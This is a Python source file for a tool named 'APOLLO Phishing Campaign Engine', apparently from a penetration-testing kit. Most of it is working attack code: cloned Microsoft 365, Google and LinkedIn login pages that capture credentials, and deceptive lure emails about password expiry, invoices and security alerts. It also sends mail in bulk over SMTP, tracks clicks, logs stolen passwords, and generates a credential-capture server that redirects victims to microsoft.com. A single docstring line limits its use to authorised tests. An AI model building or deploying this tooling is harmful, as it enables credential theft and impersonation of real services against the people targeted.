#!/usr/bin/env python3
"""
APOLLO Phishing Campaign Engine - Template-based phishing,
credential harvesting page generation, campaign tracking.
"""
import sys, os, json, base64, hashlib, random, string, time
from datetime import datetime, timedelta
from email.mime.text import MIMEText
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import *

CAMPAIGNS_DIR = os.path.expanduser("~/.config/opencode/apollo-engine/campaigns/")

PHISHING_TEMPLATES = {
    "microsoft_login": {
        "name": "Microsoft 365 Login",
        "description": "Fake Microsoft login page that captures credentials",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><title>Microsoft Sign In</title>
<style>body{font-family:Segoe UI,sans-serif;background:#f0f0f0;display:flex;justify-content:center;padding-top:100px}
.card{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:360px}
.logo{text-align:center;margin-bottom:30px}
.logo img{width:120px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:14px}
button{width:100%;padding:12px;background:#0067b8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{background:#005da6}
.error{color:red;display:none}</style></head>
<body><div class="card">
<div class="logo"><svg width="120" viewBox="0 0 21 21"><path fill="#f25022" d="M0 0h10v10H0z"/><path fill="#7fba00" d="M11 0h10v10H11z"/><path fill="#00a4ef" d="M0 11h10v10H0z"/><path fill="#ffb900" d="M11 11h10v10H11z"/></svg></div>
<h2>Sign in to Microsoft 365</h2>
<form method="POST" action="/capture">
<input type="email" name="username" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<p style="text-align:center;margin-top:20px;font-size:12px;color:#666">Copyright 2024 Microsoft Corporation</p>
</div></body></html>"""
    },
    "google_login": {
        "name": "Google Sign In",
        "description": "Fake Google login page",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><title>Google Sign In</title>
<style>body{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;padding-top:120px}
.card{background:white;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;width:368px}
.logo{text-align:center;margin-bottom:30px}
input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{background:#1557b0}</style></head>
<body><div class="card">
<div class="logo"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
<h2>Sign in</h2>
<p style="color:#5f6368;margin-bottom:30px">Use your Google Account</p>
<form method="POST" action="/capture">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<button type="submit">Next</button>
</form>
</div></body></html>"""
    },
    "generic_linkedin": {
        "name": "LinkedIn Login",
        "description": "Fake LinkedIn login page",
        "fields": ["session_key", "session_password"],
        "html": """<!DOCTYPE html><html><head><title>LinkedIn Login</title>
<style>body{font-family:-apple-system,sans-serif;background:#f3f2ef;display:flex;justify-content:center;padding-top:80px}
.card{background:white;padding:32px;border-radius:8px;width:352px;text-align:center}
.logo{color:#0a66c2;font-size:36px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:16px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#004182}</style></head>
<body><div class="card">
<div class="logo">in</div>
<h2>Sign in</h2>
<form method="POST" action="/capture">
<input type="text" name="session_key" placeholder="Email or phone" required>
<input type="password" name="session_password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
</div></body></html>"""
    }
}

SMTP_TEMPLATES = {
    "password_expiry": {
        "subject": "Your password expires today",
        "body": "Dear {name},\n\nYour password for {service} will expire in 24 hours.\nPlease click below to renew your password immediately:\n\n{link}\n\nIT Security Department"
    },
    "invoice": {
        "subject": "Invoice #{invoice_id} - Payment Required",
        "body": "Dear {name},\n\nPlease find the attached invoice #{invoice_id} for ${amount}.\nClick here to view and process payment:\n\n{link}\n\nAccounts Payable"
    },
    "document_share": {
        "subject": "{sender} shared a document with you",
        "body": "{name},\n\n{sender} has shared a confidential document with you via {service}.\n\nClick here to view:\n{link}\n\nThis link expires in 7 days."
    },
    "security_alert": {
        "subject": "Security Alert: Unusual sign-in detected",
        "body": "Dear {name},\n\nWe detected a sign-in to your {service} account from an unrecognized device.\n\nLocation: {location}\nTime: {time}\n\nIf this wasn't you, please secure your account immediately:\n{link}\n\n{service} Security Team"
    }
}

def generate_campaign_id():
    return "CAMP-" + hashlib.md5(str(random.getrandbits(256)).encode()).hexdigest()[:12].upper()

def create_phishing_page(template_name, output_dir=None):
    if template_name not in PHISHING_TEMPLATES:
        return {"error": f"Unknown template: {template_name}. Available: {list(PHISHING_TEMPLATES.keys())}"}
    tmpl = PHISHING_TEMPLATES[template_name]
    if output_dir is None:
        output_dir = os.path.join(CAMPAIGNS_DIR, "pages")
    os.makedirs(output_dir, exist_ok=True)
    page_path = os.path.join(output_dir, f"{template_name}.html")
    with open(page_path, "w") as f:
        f.write(tmpl["html"])
    return {
        "template": template_name,
        "name": tmpl["name"],
        "path": page_path,
        "fields": tmpl["fields"]
    }

def list_templates():
    result = {}
    for name, tmpl in PHISHING_TEMPLATES.items():
        result[name] = {"name": tmpl["name"], "description": tmpl["description"], "fields": tmpl["fields"]}
    return result

def list_smtp_templates():
    result = {}
    for name, tmpl in SMTP_TEMPLATES.items():
        result[name] = {"subject": tmpl["subject"]}
    return result

def render_smtp_template(template_name, variables):
    if template_name not in SMTP_TEMPLATES:
        return {"error": f"Unknown template: {template_name}"}
    tmpl = SMTP_TEMPLATES[template_name]
    try:
        subject = tmpl["subject"].format(**variables)
        body = tmpl["body"].format(**variables)
    except KeyError as e:
        return {"error": f"Missing variable: {e}"}
    return {"subject": subject, "body": body}

def create_campaign(name, template, target_emails, smtp_config=None):
    """Create a phishing campaign and track it in KB."""
    campaign_id = generate_campaign_id()
    campaign = {
        "id": campaign_id,
        "name": name,
        "template": template,
        "targets": target_emails if isinstance(target_emails, list) else target_emails.split(","),
        "created": datetime.now().isoformat(),
        "status": "draft",
        "clicks": 0,
        "submissions": 0,
        "captured_creds": []
    }
    campaign_path = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.json")
    os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
    with open(campaign_path, "w") as f:
        json.dump(campaign, f, indent=2)
    pid = get_project_id()
    add_note(pid, f"Phishing Campaign: {name}", json.dumps(campaign, indent=2), "phishing")
    create_event(pid, "phishing_campaign", "phishing_engine",
                f"Campaign '{name}' created with {len(campaign['targets'])} targets",
                campaign, "high")
    return campaign

def log_capture(campaign_id, username, password, source_ip):
    """Log a credential capture from a phishing page."""
    campaign_path = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.json")
    if not os.path.exists(campaign_path):
        return {"error": "Campaign not found"}
    with open(campaign_path) as f:
        campaign = json.load(f)
    campaign["submissions"] += 1
    capture = {
        "username": username,
        "password": password,
        "source_ip": source_ip,
        "timestamp": datetime.now().isoformat()
    }
    campaign["captured_creds"].append(capture)
    with open(campaign_path, "w") as f:
        json.dump(campaign, f, indent=2)
    pid = get_project_id()
    add_credential(None, "phishing", username, password, source="phishing")
    create_event(pid, "phishing_capture", "phishing_engine",
                f"Credential captured for {username} from {source_ip}",
                capture, "critical")
    return capture

def list_campaigns():
    os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
    campaigns = []
    for f in sorted(os.listdir(CAMPAIGNS_DIR)):
        if f.endswith(".json"):
            with open(os.path.join(CAMPAIGNS_DIR, f)) as cf:
                campaign = json.load(cf)
                campaigns.append({
                    "id": campaign["id"],
                    "name": campaign["name"],
                    "template": campaign["template"],
                    "targets": len(campaign["targets"]),
                    "clicks": campaign.get("clicks", 0),
                    "submissions": campaign.get("submissions", 0),
                    "status": campaign.get("status", "unknown"),
                    "created": campaign.get("created", "")
                })
    return sorted(campaigns, key=lambda x: x.get("created", ""), reverse=True)

def send_campaign_emails(campaign_id, smtp_server="localhost", smtp_port=25,
                         smtp_user="", smtp_pass="", use_tls=False, sender="noreply@company.com",
                         template_name="password_expiry", variables=None, max_emails=None):
    """Actually send phishing emails via SMTP for a campaign."""
    import smtplib
    campaign_path = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.json")
    if not os.path.exists(campaign_path):
        return {"error": f"Campaign {campaign_id} not found"}
    with open(campaign_path) as f:
        campaign = json.load(f)
    if template_name not in SMTP_TEMPLATES:
        return {"error": f"Unknown SMTP template: {template_name}"}
    targets = campaign["targets"]
    if max_emails:
        targets = targets[:max_emails]
    var = variables or {"name": "User", "service": "Microsoft", "sender": "IT Admin",
                        "location": "Unknown", "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
                        "invoice_id": str(random.randint(10000, 99999)), "amount": str(random.randint(100, 5000))}
    results = []
    try:
        if smtp_user and smtp_pass:
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            if use_tls: server.starttls()
            server.login(smtp_user, smtp_pass)
        else:
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        for i, target in enumerate(targets):
            var["name"] = target.split("@")[0]
            var["link"] = f"http://phish-server:{8080}/click/{campaign_id}/{i}"
            rendered = render_smtp_template(template_name, var)
            if "error" in rendered:
                continue
            msg = MIMEText(rendered["body"])
            msg["Subject"] = rendered["subject"]
            msg["From"] = sender
            msg["To"] = target
            msg["Message-ID"] = f"<apollo-{campaign_id}-{i}@phish>"
            try:
                server.send_message(msg)
                results.append({"target": target, "status": "sent"})
            except Exception as e:
                results.append({"target": target, "status": "failed", "error": str(e)[:100]})
        server.quit()
    except Exception as e:
        return {"error": f"SMTP connection failed: {str(e)[:100]}", "results": results}
    campaign["status"] = "sent"
    campaign["sent_count"] = len([r for r in results if r.get("status") == "sent"])
    with open(campaign_path, "w") as f:
        json.dump(campaign, f, indent=2)
    return {"campaign_id": campaign_id, "sent": campaign["sent_count"],
            "total": len(targets), "results": results}


def track_click(campaign_id, target_idx):
    """Record a phish click event."""
    campaign_path = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.json")
    if not os.path.exists(campaign_path):
        return {"error": "Campaign not found"}
    with open(campaign_path) as f:
        campaign = json.load(f)
    campaign["clicks"] = campaign.get("clicks", 0) + 1
    if "click_log" not in campaign:
        campaign["click_log"] = []
    campaign["click_log"].append({
        "target_idx": int(target_idx) if target_idx else None,
        "timestamp": datetime.now().isoformat()
    })
    with open(campaign_path, "w") as f:
        json.dump(campaign, f, indent=2)
    pid = get_project_id()
    create_event(pid, "phishing_click", "phishing_engine",
                 f"Phish click recorded for campaign {campaign_id}",
                 {"campaign_id": campaign_id, "target_idx": target_idx}, "high")
    return {"campaign_id": campaign_id, "total_clicks": campaign["clicks"]}


def generate_phishing_server(template_name, port=8080):
    """Generate a simple phishing credential capture server."""
    if template_name not in PHISHING_TEMPLATES:
        return {"error": f"Unknown template: {template_name}. Available: {list(PHISHING_TEMPLATES.keys())}"}
    server_code = f'''#!/usr/bin/env python3
"""APOLLO Phishing Server - DO NOT RUN OUTSIDE AUTHORIZED TEST"""
import http.server, json, urllib.parse, os, sys
PORT = {port}
CAMPAIGN_ID = "{generate_campaign_id()}"
HTML = """{phishing_html}"""
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = dict(urllib.parse.parse_qsl(body))
        print(f"[CAPTURE] {{params}} from {{self.client_address[0]}}")
        with open("captured_creds.txt", "a") as f:
            f.write(f"{{params}} from {{self.client_address[0]}}\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h2>Redirecting...</h2><meta http-equiv='refresh' content='0;url=https://www.microsoft.com'>")
print(f"APOLLO Phishing server on :{PORT}")
http.server.HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
'''
    # Replace template placeholders
    escaped_html = PHISHING_TEMPLATES[template_name]["html"].replace('"""', '\\"\\"\\"')
    server_code = server_code.replace("{phishing_html}", escaped_html)
    output_path = os.path.join(CAMPAIGNS_DIR, f"phish_server_{template_name}.py")
    os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
    with open(output_path, "w") as f:
        f.write(server_code)
    os.chmod(output_path, 0o755)
    return {"path": output_path, "campaign_id": CAMPAIGN_ID, "port": port}

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "templates":
            print(json.dumps(list_templates(), indent=2))
        elif cmd == "smtp-templates":
            print(json.dumps(list_smtp_templates(), indent=2))
        elif cmd == "create-page" and len(sys.argv) > 2:
            result = create_phishing_page(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else None)
            print(json.dumps(result, indent=2))
        elif cmd == "create-server" and len(sys.argv) > 2:
            port = int(sys.argv[3]) if len(sys.argv) > 3 else 8080
            result = generate_phishing_server(sys.argv[2], port)
            print(json.dumps(result, indent=2))
        elif cmd == "create-campaign":
            name = sys.argv[2] if len(sys.argv) > 2 else input("Campaign name: ")
            template = sys.argv[3] if len(sys.argv) > 3 else input("Template: ")
            targets = sys.argv[4] if len(sys.argv) > 4 else input("Target emails (comma-separated): ")
            result = create_campaign(name, template, targets)
            print(json.dumps({k: v for k, v in result.items() if k != "captured_creds"}, indent=2))
        elif cmd == "send" and len(sys.argv) > 2:
            cid = sys.argv[2]
            smtp_srv = sys.argv[3] if len(sys.argv) > 3 else "localhost"
            smtp_port = int(sys.argv[4]) if len(sys.argv) > 4 else 25
            smtp_user = sys.argv[5] if len(sys.argv) > 5 else ""
            smtp_pass = sys.argv[6] if len(sys.argv) > 6 else ""
            tpl = sys.argv[7] if len(sys.argv) > 7 else "password_expiry"
            result = send_campaign_emails(cid, smtp_srv, smtp_port, smtp_user, smtp_pass,
                                          template_name=tpl)
            print(json.dumps(result, indent=2))
        elif cmd == "track-click" and len(sys.argv) > 3:
            result = track_click(sys.argv[2], sys.argv[3])
            print(json.dumps(result, indent=2))
        elif cmd == "list":
            print(json.dumps(list_campaigns(), indent=2))
        elif cmd == "render" and len(sys.argv) > 2:
            template = sys.argv[2]
            vars_list = sys.argv[3] if len(sys.argv) > 3 else "{}"
            variables = json.loads(vars_list)
            result = render_smtp_template(template, variables)
            print(json.dumps(result, indent=2))
        else:
            print("Usage:")
            print("  phishing_engine.py templates                  - List page templates")
            print("  phishing_engine.py smtp-templates             - List SMTP templates")
            print("  phishing_engine.py create-page <template> [dir]")
            print("  phishing_engine.py create-server <template> [port]")
            print("  phishing_engine.py create-campaign <name> <template> <emails>")
            print("  phishing_engine.py send <id> [smtp] [port] [user] [pass] [template]")
            print("  phishing_engine.py track-click <campaign_id> <target_idx>")
            print("  phishing_engine.py list                        - List campaigns")
            print("  phishing_engine.py render <template> '{\"key\":\"val\"}'")
